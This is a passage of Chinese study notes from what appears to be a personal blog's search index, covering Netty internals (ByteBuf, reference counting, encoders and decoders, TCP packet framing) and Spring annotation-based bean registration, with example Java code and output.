Unpooled.copiedBuffer(&quot;hello world&quot;, Charset.forName(&quot;utf-8&quot;)); // 判断是否为堆缓存，如果是堆缓存，返回true if (byteBuf.hasArray()) { byte[] bytes = byteBuf.array(); System.out.println(new String(bytes, Charset.forName(&quot;utf-8&quot;))); System.out.println(byteBuf); System.out.println(byteBuf.arrayOffset()); // 可读字节第一偏移量 System.out.println(byteBuf.readerIndex()); System.out.println(byteBuf.writerIndex()); System.out.println(byteBuf.capacity()); } }} 输出： hello world UnpooledByteBufAllocator$InstrumentedUnpooledUnsafeHeapByteBuf(ridx: 0, widx: 11, cap: 33)001133 ridx 表示读的 index，widx 表示写的 index 我们来看看复合 Buffer public class ByteBufTest03 { public static void main(String[] args) { // 新建一个复合 buffer CompositeByteBuf compositeByteBuf = Unpooled.compositeBuffer(); ByteBuf heapBuf = Unpooled.buffer(10); ByteBuf directBuf = Unpooled.directBuffer(8); compositeByteBuf.addComponent(heapBuf); compositeByteBuf.addComponent(directBuf); compositeByteBuf.forEach(System.out::println); // 输出 // UnpooledSlicedByteBuf(ridx: 0, widx: 0, cap: 0/0, unwrapped: UnpooledByteBufAllocator$InstrumentedUnpooledUnsafeHeapByteBuf(ridx: 0, widx: 0, cap: 10)) // UnpooledSlicedByteBuf(ridx: 0, widx: 0, cap: 0/0, unwrapped: UnpooledByteBufAllocator$InstrumentedUnpooledUnsafeNoCleanerDirectByteBuf(ridx: 0, widx: 0, cap: 8)) }} Netty 提供的 3 种缓冲区heap buffer（堆缓冲区）： 这是最常见的类型，ByteBuf 将数据存储到 JVM 的堆空间中，并且将实际的数据放到 byte 数组中来实现的 优点：由于数据是存储在 JVM 的堆中，因此可以快速的创建和快速的释放，并且它提供了 直接访问内部字节数组的方法 缺点：每次读写数据时，都需要先将数据复制到直接缓冲中再进行网络传输 direct buffer（直接缓冲区）： 在堆之外直接分配内存空间，直接缓冲区并不会占用堆的容量空间，因为他是有操作系统在本地内存进行的数据分配 优点：在使用 Socket 进行数据传输时，性能非常好，因为数据直接位于操作系统的本地内存中，所以不需要从 JVM 将数据复制到直接缓冲区 缺点：因为 Direct Buffer 是直接在操作系统内存中的，所以内存空间分配与释放要比堆空间更加复杂，而且速度要慢一些 Netty 通过提供内存池来解决这个问题，直接缓冲区并不支持通过字节数组的方式来访问数据 重点：对于后端的业务消息的编解码来说，推荐使用 HeapByteBuf；对于 I/O 通信的读写缓冲区，我们推荐使用 DirectBytebuf composite buffer（符合缓冲区）： 复合缓冲区实际上是将多个缓冲区实例组合起来，并向外提供一个统一视图。像是一个缓冲区的 List JDK 的 ByteBuffer 与 Netty 的 ByteBuf 之间的差异比对 Netty 的 ByteBuf 采用了读写分离的策略（readerIndex 和 writeerIndex），一个初始化（里面尚未有任何数据）的 ByteBuf 的 readerIndex 与 writerIndex 的值都为0 当数索引与写索引处于同一个位置时，如果我们继续读取，那么就会抛出 IndexOutOfBoundsException 对于ByteBuf 的任何读写操作都会分别单独维护读索引和写索引，MaxCapacity 最大的容量默认为Integer.MAX_VALUE JDK 的 ByteBuffer的缺点： final byte[] hb; 这是JDK的ByteBuffer对象中用于储存的对象声明，可以看到，其字节数组布尔声明为final的，也就是长度是固定不变的，一旦分配好后就不能动态扩容与收缩，而且当储存的数据字节很大时就很有可能出现IndexOutOfBoundsException，如果要预防着个异常，那就需要再储存之前完全确定好待储存的字节的大小，如果ByteBuffer的空间不足，我们只有一种解决方案，那就是创建新的ByteBuffer对象，然后再将之前的ByteBuffer中的数据复制过去，这一切操作都需要由开发者自己来手动完成的 ByteBuffer 只使用一个position 指针来标识位置信息，在进行读写切换时就需要调用flip方法或则是rewind 方法，使用很不方便 Netty 的 ByteBuf 的优点： 储存字节的数组是动态的，其最大值默认是Integer.MAX_VALUE，这里的动态性是体现在write方法中的，write方法执行会判断buffer容量，如果不足则会自动扩容 ByteBuf的读写索引是完成分开的，使用起来很方便 // io.netty.buffer.AbstractByteBuf#writeByte @Override public ByteBuf writeByte(int value) { ensureWritable0(1); // 会先判断是否够写入一个字节 _setByte(writerIndex++, value); return this; }// io.netty.buffer.AbstractByteBuf#ensureWritable0// 会自动扩容 final void ensureWritable0(int minWritableBytes) { ensureAccessible(); if (minWritableBytes &lt;= writableBytes()) { return; } if (minWritableBytes &gt; maxCapacity - writerIndex) { throw new IndexOutOfBoundsException(String.format( &quot;writerIndex(%d) + minWritableBytes(%d) exceeds maxCapacity(%d): %s&quot;, writerIndex, minWritableBytes, maxCapacity, this)); } // Normalize the current capacity to the power of 2. int newCapacity = alloc().calculateNewCapacity(writerIndex + minWritableBytes, maxCapacity); // Adjust to the new capacity. capacity(newCapacity); }","link":"/2019/01/19/Netty_%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E5%9B%9B%EF%BC%89/"},{"title":"Netty 源码分析（五）","text":"版本 4.1.15 官网：https://netty.io/ Netty is an asynchronous event-driven network application framework for rapid development of maintainable high performance protocol servers &amp; clients. ReferenceCountedio.netty.util.ReferenceCounted 引用计数文档 public interface ReferenceCountedA reference-counted object that requires explicit deallocation.When a new ReferenceCounted is instantiated, it starts with the reference count of 1. retain() increases the reference count, and release() decreases the reference count. If the reference count is decreased to 0, the object will be deallocated explicitly, and accessing the deallocated object will usually result in an access violation.If an object that implements ReferenceCounted is a container of other objects that implement ReferenceCounted, the contained objects will also be released via release() when the container’s reference count becomes 0. 我们看看其中的方法 public interface ReferenceCounted { /** * Returns the reference count of this object. If {@code 0}, it means this object has been deallocated. */ int refCnt(); /** * Increases the reference count by {@code 1}. */ ReferenceCounted retain(); /** * Increases the reference count by the specified {@code increment}. */ ReferenceCounted retain(int increment); /** * Records the current access location of this object for debugging purposes. * If this object is determined to be leaked, the information recorded by this operation will be provided to you * via {@link ResourceLeakDetector}. This method is a shortcut to {@link #touch(Object) touch(null)}. */ ReferenceCounted touch(); /** * Records the current access location of this object with an additional arbitrary information for debugging * purposes. If this object is determined to be leaked, the information recorded by this operation will be * provided to you via {@link ResourceLeakDetector}. */ ReferenceCounted touch(Object hint); /** * Decreases the reference count by {@code 1} and deallocates this object if the reference count reaches at * {@code 0}. * * @return {@code true} if and only if the reference count became {@code 0} and this object has been deallocated */ boolean release(); /** * Decreases the reference count by the specified {@code decrement} and deallocates this object if the reference * count reaches at {@code 0}. * * @return {@code true} if and only if the reference count became {@code 0} and this object has been deallocated */ boolean release(int decrement);} AbstractReferenceCountedByteBufio.netty.buffer.AbstractReferenceCountedByteBuf 我们先来看两个比较重要的方法，retain() 和 release() 方法 retain()io.netty.buffer.AbstractReferenceCountedByteBuf#retain() retain() 方法可以使引用计数加一 @Overridepublic ByteBuf retain() { return retain0(1);}@Overridepublic ByteBuf retain(int increment) { return retain0(checkPositive(increment, &quot;increment&quot;));}private ByteBuf retain0(int increment) { for (;;) { int refCnt = this.refCnt; final int nextCnt = refCnt + increment; // 如果 refCnt = 0 的时候 nextCont = increment，就就应该被回收 // Ensure we not resurrect (which means the refCnt was 0) and also that we encountered an overflow. if (nextCnt &lt;= increment) { throw new IllegalReferenceCountException(refCnt, increment); } // 这里使用到了自旋锁 if (refCntUpdater.compareAndSet(this, refCnt, nextCnt)) { break; } } return this;} java.util.concurrent.atomic.AtomicIntegerFieldUpdater public abstract class AtomicIntegerFieldUpdaterextends ObjectA reflection-based utility that enables atomic updates to designated volatile int fields of designated classes. This class is designed for use in atomic data structures in which several fields of the same node are independently subject to atomic updates.Note that the guarantees of the compareAndSet method in this class are weaker than in other atomic classes. Because this class cannot ensure that all uses of the field are appropriate for purposes of atomic access, it can guarantee atomicity only with respect to other invocations of compareAndSet and set on the same updater. AtomicIntegerFieldUpdater要点的总结： 更新器必须是int类型的变量，不能是其他包装类型 更新器的更新必须是volatile类型的变量，确保线程之间的共享变量时的立即可见性 变量不能是static的，必须是实例变量，因为Unsafe.objectFieldOffset() 方法不支持静态变量（CAS操作本质是通过对象实例的偏移来直接进行赋值） 更新器只能修改它可见范围内的变量，因为更新器是通过反射来得到这个变量，如果变量不可见就会报错 如果更新的变量时包装类型，那么可以使用AtomicReferenceFieldUpdater来进行更新 java.util.concurrent.atomic.AtomicIntegerFieldUpdater#compareAndSet public abstract boolean compareAndSet(T obj, int expect, int update)Atomically sets the field of the given object managed by this updater to the given updated value if the current value == the expected value. This method is guaranteed to be atomic with respect to other calls to compareAndSet and set, but not necessarily with respect to other changes in the field.Parameters:obj - An object whose field to conditionally setexpect - the expected valueupdate - the new value 一个不安全的更新 /** * @Author: cuzz * @Date: 2019/1/19 15:40 * @Description: */public class AtomicUpdateTest { public static void main(String[] args) { Person person = new Person(); for (int i = 0; i &lt; 10; i++) { new Thread(() -&gt; { try { Thread.sleep(20); } catch (InterruptedException e) { e.printStackTrace(); } System.out.print(person.age++ + &quot; &quot;); // 1 6 7 5 4 2 3 1 8 9 }).start(); } }}class Person{ int age = 1;} 使用AtomicIntegerFieldUpdater /** * @Author: cuzz * @Date: 2019/1/19 15:40 * @Description: */public class AtomicUpdateTest { public static void main(String[] args) { AtomicIntegerFieldUpdater&lt;Person&gt; fieldUpdater = AtomicIntegerFieldUpdater.newUpdater(Person.class, &quot;age&quot;); Person person = new Person(); for (int i = 0; i &lt; 10; i++) { new Thread(() -&gt; { try { Thread.sleep(20); } catch (InterruptedException e) { e.printStackTrace(); } System.out.print(fieldUpdater.getAndIncrement(person) + &quot; &quot;); // 1 4 3 2 5 6 7 10 9 8 }).start(); } }}class Person{ volatile int age = 1;} 大概有以下两种字段适合用Atomic*FieldUpdater: 大多数用到这个字段的代码是在读取字段的值, 但仍然有通过CAS更新字段值的需求. 这个时候用AtomicInteger的话每个直接读取这个字段的地方都要多一次.get()调用, 用volatile又满足不了需求, 所以就用到了AtomicIntegerFieldUpdater 这个字段所属的类会被创建大量的实例对象, 如果用AtomicInteger, 每个实例里面都要创建AtomicInteger对象, 从而多出内存消耗. 比如一个链表类的Node, 用AtomicReference保存next显然是不合适的. 原文：https://blog.csdn.net/u012415542/article/details/80646605 private static final AtomicIntegerFieldUpdater&lt;AbstractReferenceCountedByteBuf&gt; refCntUpdater = AtomicIntegerFieldUpdater.newUpdater(AbstractReferenceCountedByteBuf.class, &quot;refCnt&quot;); Reference counted objects引用计数文档：Reference counted objects Netty 处理器重要概念 Netty 的处理器可以分为两类：入站处理器和出站处理器 入站处理器的顶层是 ChannelnboundHandler，出站处理器的顶层是 ChannelOutboundHandler 数据处理时常用的各种解码器本质上都是处理器 编解码器：无论我们向网络中写入的数据是什么类型，数据在网络中传递时，其都是以字节流的形式呈现，将数据有原本的字节流的操作成为编码（encode），将数据有字节转化为它原本的格式或是其它的操作成为解码（decode），编码统一称为（codec） 编码：本质上是一种出站处理器，因此，编码一定是一种 ChannelOutboundHandler 解码：本质上是一种入站处理器，因此，解码一定是一种 ChannelInboundHandler 在 Netty 中，编码器通常以 xxxEncoder命名；解码器通常以xxxDecoder命名 编写一个Long类型的解码器编写一个解码器在客服端与服务端传输一个 Long 型的数据，Netty 为我们提供了 ByteToMessageDecoder io.netty.handler.codec.ByteToMessageDecoder io.netty.handler.codecpublic abstract class ByteToMessageDecoderextends ChannelInboundHandlerAdapterChannelInboundHandlerAdapter which decodes bytes in a stream-like fashion from one ByteBuf to an other Message type. For example here is an implementation which reads all readable bytes from the input ByteBuf and create a new ByteBuf. public class SquareDecoder extends ByteToMessageDecoder { @Override public void decode(ChannelHandlerContext ctx, ByteBuf in, List out) throws Exception { out.add(in.readBytes(in.readableBytes())); } } Frame detectionGenerally frame detection should be handled earlier in the pipeline by adding a DelimiterBasedFrameDecoder, FixedLengthFrameDecoder, LengthFieldBasedFrameDecoder, or LineBasedFrameDecoder.If a custom frame decoder is required, then one needs to be careful when implementing one with ByteToMessageDecoder. Ensure there are enough bytes in the buffer for a complete frame by checking ByteBuf.readableBytes(). If there are not enough bytes for a complete frame, return without modifying the reader index to allow more bytes to arrive.To check for complete frames without modifying the reader index, use methods like ByteBuf.getInt(int). One MUST use the reader index when using methods like ByteBuf.getInt(int). For example calling in.getInt(0) is assuming the frame starts at the beginning of the buffer, which is not always the case. Use in.getInt(in.readerIndex()) instead.PitfallsBe aware that sub-classes of ByteToMessageDecoder MUST NOT annotated with @Sharable.Some methods such as ByteBuf.readBytes(int) will cause a memory leak if the returned buffer is not released or added to the out List. Use derived buffers like ByteBuf.readSlice(int) to avoid leaking memory. MyByteToLongDecoder /** * @Author: cuzz * @Date: 2019/1/22 12:16 * @Description: */public class MyByteToLongDecoder extends ByteToMessageDecoder{ @Override protected void decode(ChannelHandlerContext ctx, ByteBuf in, List&lt;Object&gt; out) throws Exception { System.out.println(&quot;decode invoked!&quot;); System.out.println(in.readableBytes()); if (in.readableBytes() &gt;= 8) { out.add(in.readLong()); } }} MyLongToByteEncoder /** * @Author: cuzz * @Date: 2019/1/22 12:23 * @Description: */public class MyLongToByteEncoder extends MessageToByteEncoder&lt;Long&gt;{ @Override protected void encode(ChannelHandlerContext ctx, Long msg, ByteBuf out) throws Exception { System.out.println(&quot;encoder invoked!&quot;); System.out.println(msg); out.writeLong(msg); }} 重要结论： 无论是编码器还是解码器，其所接收的消息类型必须要与待处理的参数保持一致，否则该编码器或则解码器不会被执行 在解码器进行数据解码时，一定要记得判断缓冲（ByteBuf）中的数据是否足够，否则将会产生一些问题 ReplayingDecoder文档：https://netty.io/4.1/api/io/netty/handler/codec/ReplayingDecoder.html 如果我们使用这个继承这个编码器，他会自动帮我判断是否可读，代码也简单，简化了我们的判断 public class MyByteToLongDecoder2 extends ReplayingDecoder&lt;Void&gt; { @Override protected void decode(ChannelHandlerContext ctx, ByteBuf in, List&lt;Object&gt; out) throws Exception { System.out.println(&quot;MyByteToLongDecoder2 decode invoked!&quot;); out.add(in.readLong()); }} LengthFieldBasedFrameDecoderio.netty.handler.codec.LengthFieldBasedFrameDecoder 文档：https://netty.io/4.1/api/io/netty/handler/codec/LengthFieldBasedFrameDecoder.html 这是一个常用语自定义协议的解码器 TCP 粘包拆包如果我写的自定义协议没有对粘包和拆包做特殊处理的话就会产生粘包和拆包现象 粘包、拆包发生原因发生TCP粘包或拆包有很多原因，现列出常见的几点，可能不全面，欢迎补充，1、要发送的数据大于TCP发送缓冲区剩余空间大小，将会发生拆包。2、待发送数据大于MSS（最大报文长度），TCP在传输前将进行拆包。3、要发送的数据小于TCP发送缓冲区的大小，TCP将多次写入缓冲区的数据一次发送出去，将会发生粘包。4、接收数据端的应用层没有及时读取接收缓冲区中的数据，将发生粘包。粘包、拆包解决办法通过以上分析，我们清楚了粘包或拆包发生的原因，那么如何解决这个问题呢？解决问题的关键在于如何给每个数据包添加边界信息，常用的方法有如下几个：1、发送端给每个数据包添加包首部，首部中应该至少包含数据包的长度，这样接收端在接收到数据后，通过读取包首部的长度字段，便知道每一个数据包的实际长度了。2、发送端将每个数据包封装为固定长度（不够的可以通过补0填充），这样接收端每次从接收缓冲区中读取固定长度的数据就自然而然的把每个数据包拆分开来。3、可以在数据包之间设置边界，如添加特殊符号，这样，接收端通过这个边界就可以将不同的数据包拆分开。 作者：wxy941011来源：CSDN原文：https://blog.csdn.net/wxy941011/article/details/80428470版权声明：本文为博主原创文章，转载请附上博文链接！ 自定义协议解决粘包和拆包一个 Person 协议类 /** * @Author: cuzz * @Date: 2019/1/22 16:00 * @Description: 这是一个关于 Person 的协议 */public class PersonProtocol { private int length; private byte[] content; public int getLength() { return length; } public void setLength(int length) { this.length = length; } public byte[] getContent() { return content; } public void setContent(byte[] content) { this.content = content; }} 解码处理器 /** * @Author: cuzz * @Date: 2019/1/22 16:04 * @Description: */public class MyPersonDecoder extends ReplayingDecoder&lt;Void&gt;{ @Override protected void decode(ChannelHandlerContext ctx, ByteBuf in, List&lt;Object&gt; out) throws Exception { System.out.println(&quot;MyPersonDecoder decode invoked!&quot;); // Gets a 32-bit integer at the current {@code readerIndex} // and increases the {@code readerIndex} by {@code 4} in this buffer. int length = in.readInt(); byte[] content = new byte[length]; // Transfers this buffer's data to the specified destination starting at // the current {@code readerIndex} and increases the {@code readerIndex} // by the number of the transferred bytes (= {@code dst.length} in.readBytes(content); // 把内容添加到协议中 PersonProtocol personProtocol = new PersonProtocol(); personProtocol.setLength(length); personProtocol.setContent(content); out.add(personProtocol); }} 编码处理器 /** * @Author: cuzz * @Date: 2019/1/22 16:12 * @Description: */public class MyPersonEncoder extends MessageToByteEncoder&lt;PersonProtocol&gt;{ @Override protected void encode(ChannelHandlerContext ctx, PersonProtocol msg, ByteBuf out) throws Exception { System.out.println(&quot;MyPersonEncoder encoder invoked!&quot;); // 消息头 out.writeInt(msg.getLength()); // 消息体 out.writeBytes(msg.getContent()); }} 服务端 /** * @Author: cuzz * @Date: 2019/1/22 16:39 * @Description: */public class MyServer { public static void main(String[] args) throws Exception{ EventLoopGroup bossGroup = new NioEventLoopGroup(1); EventLoopGroup workGroup = new NioEventLoopGroup(); try { ServerBootstrap serverBootstrap = new ServerBootstrap(); serverBootstrap.group(bossGroup, workGroup) .channel(NioServerSocketChannel.class) .childHandler(new ChannelInitializer&lt;SocketChannel&gt;() { @Override protected void initChannel(SocketChannel ch) throws Exception { ChannelPipeline pipeline = ch.pipeline(); pipeline.addLast(new MyPersonDecoder()); pipeline.addLast(new MyPersonEncoder()); pipeline.addLast(new MyServerHandler()); } }); ChannelFuture channelFuture = serverBootstrap.bind(8899).sync(); channelFuture.channel().closeFuture().sync(); } finally { bossGroup.shutdownGracefully(); workGroup.shutdownGracefully(); } }}/** * @Author: cuzz * @Date: 2019/1/22 16:16 * @Description: */public class MyServerHandler extends SimpleChannelInboundHandler&lt;PersonProtocol&gt;{ private int count; @Override protected void channelRead0(ChannelHandlerContext ctx, PersonProtocol msg) throws Exception { int length = msg.getLength(); byte[] content = msg.getContent(); System.out.println(&quot;服务端接收到的数据：&quot;); System.out.println(&quot;长度：&quot; + length); System.out.println(&quot;内容：&quot; + new String(content, Charset.forName(&quot;utf-8&quot;))); System.out.println(&quot;服务器接收到的消息数量：&quot; + (++this.count)); PersonProtocol personProtocol = new PersonProtocol(); String resp = &quot;hello, world&quot;; personProtocol.setLength(resp.getBytes(&quot;utf-8&quot;).length); personProtocol.setContent(resp.getBytes(&quot;utf-8&quot;)); ctx.writeAndFlush(personProtocol); }} 客服端 public class MyClient { public static void main(String[] args) throws Exception { EventLoopGroup eventLoopGroup = new NioEventLoopGroup(); try { Bootstrap bootstrap = new Bootstrap(); bootstrap.group(eventLoopGroup) .channel(NioSocketChannel.class) .handler(new ChannelInitializer&lt;SocketChannel&gt;() { @Override protected void initChannel(SocketChannel ch) throws Exception { ChannelPipeline pipeline = ch.pipeline(); pipeline.addLast(new MyPersonDecoder()); pipeline.addLast(new MyPersonEncoder()); pipeline.addLast(new MyClientHandler()); } }); ChannelFuture channelFuture = bootstrap.connect(&quot;localhost&quot;,8899).sync(); channelFuture.channel().closeFuture().sync(); } finally { eventLoopGroup.shutdownGracefully(); } }}/** * @Author: cuzz * @Date: 2019/1/22 16:25 * @Description: */public class MyClientHandler extends SimpleChannelInboundHandler&lt;PersonProtocol&gt;{ private int count; @Override protected void channelRead0(ChannelHandlerContext ctx, PersonProtocol msg) throws Exception { int length = msg.getLength(); byte[] content = msg.getContent(); System.out.println(&quot;客户端接收的消息：&quot;); System.out.println(&quot;消息的长度：&quot; + length); System.out.println(&quot;消息的内容：&quot; + new String(content, Charset.forName(&quot;utf-8&quot;))); System.out.println(&quot;客户端接收到的消息数量：&quot; + (++count)); } @Override public void channelActive(ChannelHandlerContext ctx) throws Exception { for (int i = 0; i &lt; 10; i++) { String messageToBeSend = &quot;send form client&quot;; PersonProtocol personProtocol = new PersonProtocol(); personProtocol.setLength(messageToBeSend.getBytes(&quot;utf-8&quot;).length); personProtocol.setContent(messageToBeSend.getBytes(&quot;utf-8&quot;)); ctx.writeAndFlush(personProtocol); } } @Override public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception { cause.printStackTrace(); ctx.close(); }} 总结这里关于 Netty 的这五篇分析都是看的圣思园张龙老师的课程自己所写下的笔记，自己对 Netty 有了简单的认识，也对 NIO 有了更深的了解，最主要的学会看英文文档，看官方文档很重要，不要惧怕，慢慢的就感觉还是文档写的最清楚，最有价值。老师还提到需要多记录，因此我也把一些重要的知识点记录下来，方便以后查找。当然以后还要加强学习，多看看 Netty 官方文档和例子，加强练习。","link":"/2019/01/22/Netty_%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%94%EF%BC%89/"},{"title":"Spring注解驱动开发（一）","text":"The Spring Framework provides a comprehensive programming and configuration model for modern Java-based enterprise applications - on any kind of deployment platform. 组件注册@Configuration和@Bean的注入1、使用xml方式 我们一起注入一个bean使用xml来配置 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt; &lt;bean id=&quot;person&quot; class=&quot;com.cuzz.bean.Person&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;cuzz&quot;&gt;&lt;/property&gt; &lt;property name=&quot;age&quot; value=&quot;18&quot;&gt;&lt;/property&gt; &lt;/bean&gt; &lt;/beans&gt; 我可以使用ClassPathXmlApplicationContext来获取 /** * @Author: cuzz * @Date: 2018/9/23 10:48 * @Description: */public class MainTest { public static void main(String[] args) { ApplicationContext applicationContext = new ClassPathXmlApplicationContext(&quot;bean.xml&quot;); // 用id获取 Person bean = (Person) applicationContext.getBean(&quot;person&quot;); System.out.println(bean); }} 输出Person(name=cuzz, age=18) 2、使用注解的方式 编写一个配置类 /** * @Author: cuzz * @Date: 2018/9/23 10:55 * @Description: 配置类 */@Configuration // 告诉Spring这是一个配置类public class MainConfig { // 给容器中注册一个Bean,类型为返回值类型,id默认用方法名 // 也可以指定id @Bean(value = &quot;person01&quot;) public Person person() { return new Person(&quot;vhsj&quot;, 16); }} 可以通过AnnotationConfigApplicationContext来获取，并且获取id /** * @Author: cuzz * @Date: 2018/9/23 10:59 * @Description: */public class MainTest { public static void main(String[] args) { AnnotationConfigApplicationContext context = new AnnotationConfigApplicationContext(MainConfig.class); Person person = (Person) context.getBean(Person.class); System.out.println(person); String[] names = context.getBeanNamesForType(Person.class); for (String name: names) { System.out.println(name); } }} 输出 Person(name=vhsj, age=16)person01 由于给bean添加一个一个value，可以改变默认id 组件注册@ComponentScan1、使用xml 只要标注了注解就能扫描到如： @Controller @Service @Repository @Component &lt;context:component-scan base-package=&quot;com.cuzz&quot;&gt;&lt;/context:component-scan&gt; 2、注解 在配置类中添加 /** * @Author: cuzz * @Date: 2018/9/23 10:55 * @Description: 配置类 */@Configuration // 告诉Spring这是一个配置类@ComponentScan(value = &quot;com.cuzz&quot;) // 指定包public class MainConfig { } 添加controller、service等 测试 /** * @Author: cuzz * @Date: 2018/9/23 13:03 * @Description: */public class IOCTest { @Test public void test01() { AnnotationConfigApplicationContext applicationContext = new AnnotationConfigApplicationContext(MainConfig.class); // 获取所有bean定义的名字 String[] beanNames = applicationContext.getBeanDefinitionNames(); for (String name : beanNames) { System.out.println(name); } }} 输出结果 org.springframework.context.annotation.internalConfigurationAnnotationProcessororg.springframework.context.annotation.internalAutowiredAnnotationProcessororg.springframework.context.annotation.internalRequiredAnnotationProcessororg.springframework.context.annotation.internalCommonAnnotationProcessororg.springframework.context.event.internalEventListenerProcessororg.springframework.context.event.internalEventListenerFactorymainConfigbookControllerbookDaobookServiceperson01 可以看出添加@Controller @Service @Repository @C omponent注解的都可以扫描到 还可以指定添加某些类，和排除某些类，进入ComponentScan注解中有下面两个方法 ComponentScan.Filter[] includeFilters() default {};ComponentScan.Filter[] excludeFilters() default {};includeFilters = Filter[] ：指定扫描的时候只需要包含哪些组件excludeFilters = Filter[] ：指定扫描的时候按照什么规则排除那些组件 配置类，排除Controller @Configuration // 告诉Spring这是一个配置类@ComponentScan(value = &quot;com.cuzz&quot;, excludeFilters = { @ComponentScan.Filter(type = FilterType.ANNOTATION, classes = {Controller.class})})public class MainConfig {} 运行测试方法，可以得出没有Controller类的 org.springframework.context.annotation.internalAutowiredAnnotationProcessororg.springframework.context.annotation.internalRequiredAnnotationProcessororg.springframework.context.annotation.internalCommonAnnotationProcessororg.springframework.context.event.internalEventListenerProcessororg.springframework.context.event.internalEventListenerFactorymainConfigbookDaobookServiceperson01 自定义TypeFilter指定过滤规则 第一和第二比较常用 FilterType.ANNOTATION：按照注解FilterType.ASSIGNABLE_TYPE：按照给定的类型；FilterType.ASPECTJ：使用ASPECTJ表达式FilterType.REGEX：使用正则指定FilterType.CUSTOM：使用自定义规则 新建一个MyTypeFilte类实现TypeFilter接口 /** * @Author: cuzz * @Date: 2018/9/23 15:03 * @Description: */public class MyTypeFilter implements TypeFilter{ /** * metadataReader：读取到的当前正在扫描的类的信息 * metadataReaderFactory:可以获取到其他任何类信息的 */ @Override public boolean match(MetadataReader metadataReader, MetadataReaderFactory metadataReaderFactory) throws IOException { // 获取当前类注解的信息 AnnotationMetadata annotationMetadata = metadataReader.getAnnotationMetadata(); // 获取当前正在扫描的类的类信息 ClassMetadata classMetadata = metadataReader.getClassMetadata(); // 获取当前类资源（类的路径） Resource resource = metadataReader.getResource(); String className = classMetadata.getClassName(); System.out.println(&quot;---&gt;&quot;+className); // 这些类名中包含er就返回true if(className.contains(&quot;er&quot;)){ return true; } return false; }} 使用自定义注解记得需要关闭默认过滤器useDefaultFilters = false /** * @Author: cuzz * @Date: 2018/9/23 10:55 * @Description: 配置类 */@Configuration @ComponentScan(value = &quot;com.cuzz&quot;, includeFilters = @ComponentScan.Filter(type = FilterType.CUSTOM, classes = MyTypeFilter.class), useDefaultFilters = false)public class MainConfig { // 给容器中注册一个Bean,类型为返回值类型,id默认用方法名 // 也可以指定id @Bean(value = &quot;person01&quot;) public Person person() { return new Person(&quot;vhsj&quot;, 16); }} 测试 ---&gt;com.cuzz.AppTest---&gt;com.cuzz.bean.MainTest---&gt;com.cuzz.config.IOCTest---&gt;com.cuzz.config.MainTest---&gt;com.cuzz.App---&gt;com.cuzz.bean.Person---&gt;com.cuzz.config.MyTypeFilter---&gt;com.cuzz.controller.BookController---&gt;com.cuzz.dao.BookDao---&gt;com.cuzz.sevice.BookServiceorg.springframework.context.annotation.internalConfigurationAnnotationProcessororg.springframework.context.annotation.internalAutowiredAnnotationProcessororg.springframework.context.annotation.internalRequiredAnnotationProcessororg.springframework.context.annotation.internalCommonAnnotationProcessororg.springframework.context.event.internalEventListenerProcessororg.springframework.context.event.internalEventListenerFactorymainConfig // 不是扫描的 person // 这个是在bean中myTypeFilter // 有erbookController // 有erbookService // 有erperson01 // 这个是在bean中 组件注册@Scope设置作用域Spring的bean默认是单例的 @Testpublic void test02() { AnnotationConfigApplicationContext applicationContext = new AnnotationConfigApplicationContext(MainConfig2.class); // 获取所有bean定义的名字 String[] beanNames = applicationContext.getBeanDefinitionNames(); for (String name : beanNames) { System.out.println(name); } Object bean = applicationContext.getBean(&quot;person&quot;); Object bean2 = applicationContext.getBean(&quot;person&quot;); System.out.println(bean == bean2); // 输出true} Scope的四个范围 ConfigurableBeanFactory#SCOPE_PROTOTYPE // 多实例 每次获取时创建对象，不会放在ioc容器中ConfigurableBeanFactory#SCOPE_SINGLETON // 单实例 ioc容器启动是创建对象，以后从容器中获取WebApplicationContext#SCOPE_REQUEST // web同一次请求创建一个实例WebApplicationContext#SCOPE_SESSION // web同一个session创建一个实例 如果我们把Scope修改 /** * @Author: cuzz * @Date: 2018/9/23 15:40 * @Description: */@Configurationpublic class MainConfig2 { @Scope(value = &quot;prototype&quot;) @Bean public Person person() { return new Person(&quot;vhuj&quot;, 25); }} 则测试输出false 组件注册@Lazy-bean懒加载懒加载 懒加载的是针对单实例Bean，默认是在容器启动的时创建的，我们可以设置懒加载容器启动是不创建对象，在第一次使用（获取）Bean创建对象，并初始化 测试 先给添加一个@Lazy注解 @Configurationpublic class MainConfig2 { @Lazy @Bean public Person person() { System.out.println(&quot;给容器中添加Person...&quot;); return new Person(&quot;vhuj&quot;, 25); }} 编写一个测试方法 @Testpublic void test03() { AnnotationConfigApplicationContext applicationContext = new AnnotationConfigApplicationContext(MainConfig2.class); System.out.println(&quot;ioc容器创建完成...&quot;); Object bean = applicationContext.getBean(&quot;person&quot;);} 输出 ioc容器创建完成...给容器中添加Person... 添加一个@Lazy是在第一次获取时，创建对象，以后获取就不需要创建了，直接从容器中获取，因为它是单实例 组件注册@Conditional按条件注册按照一定条件进行判断，满足条件给容器中注册Bean 编写自己的Condition类 如果系统是windows，给容器中注入”bill” 如果系统是linux，给容器中注入”linus” 编写WindowCondition类并重写matches方法 /** * @Author: cuzz * @Date: 2018/9/23 20:30 * @Description: 判断是否是windows */ public class WindowCondition implements Condition{ /** * @param context 判断条件 * @param metadata 注释信息 * @return boolean */ @Override public boolean matches(ConditionContext context, AnnotatedTypeMetadata metadata) { Environment environment = context.getEnvironment(); String property = environment.getProperty(&quot;os.name&quot;); if (property.contains(&quot;Windows&quot;)) { return true; } return false; } } context有以下方法 // 能获取ioc使用的beanfactoryConfigurableListableBeanFactory beanFactory = context.getBeanFactory();// 能获取到类加载器ClassLoader classLoader = context.getClassLoader();// 获取到环境变量Environment environment = context.getEnvironment();// 获取到Bean定义的注册类BeanDefinitionRegistry registry = context.getRegistry(); 配置类 添加Bean添加Condition条件 @Configurationpublic class MainConfig2 { @Conditional({WindowCondition.class}) 